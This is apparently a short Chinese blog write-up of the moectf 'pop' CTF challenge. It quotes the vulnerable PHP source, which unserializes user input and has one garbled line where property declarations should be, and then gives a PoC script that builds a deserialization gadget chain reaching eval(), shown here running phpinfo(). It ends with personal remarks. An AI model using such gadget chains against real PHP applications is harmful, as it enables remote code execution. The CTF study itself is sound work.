# moectf-pop

<br>

将近半年没有接触反序列化，上手竟觉得如此生疏，贴一下原题和poc

<br>

## 原题

<br>

````
<?php

class class000 {
ni



    public function __destruct()
    {
        $this->check();
    }

    public function check()
    {
        if($this->payl0ad === 0)
        {
            die('FAILED TO ATTACK');
        }
        $a = $this->what;
        $a();
    }
}

class class001 {
    public $payl0ad;
    public $a;
    public function __invoke()
    {
        $this->a->payload = $this->payl0ad;
    }
}

class class002 {
    private $sec;
    public function __set($a, $b)
    {
        $this->$b($this->sec);
    }
    public function dangerous($whaattt)
    {
        $whaattt->evvval($this->sec);
    }

}

class class003 {
    public $mystr;
    public function evvval($str)
    {
        eval($str);
    }

    public function __tostring()
    {
        return $this->mystr;
    }
}

if(isset($_GET['data']))
{
    $a = unserialize($_GET['data']);
}
else {
    highlight_file(__FILE__);
}
````

<br>

## Poc

<br>

````
<?php

class class000 {
    private $payl0ad=1;
    public $what='class001';


}

class class001 {
    public $payl0ad='echo';
    public $a;

}

class class002 {
    public $sec;


}

class class003 {
    public $mystr;

}

$x=new class000;
$y=new class001;
$z=new class002;
$p=new class003;

$x->what = $y;
$y->a=$z;
$y->payl0ad='dangerous';
$z->sec=$p;
$p->mystr='phpinfo();';

echo urlencode(serialize($x));
?>
````

<br>

这里特别注意一下因为eval函数执行的是php命令，记得带上";"



<br>

## 写在后面

<br>

最近心情是真的低落，有点回到疫情的时候的感觉了。去年夏天的阴影还是没法缓解，每每想起就害怕得想哭。估计是呆在家里太久，把人闷出事了。希望能赶快调整回来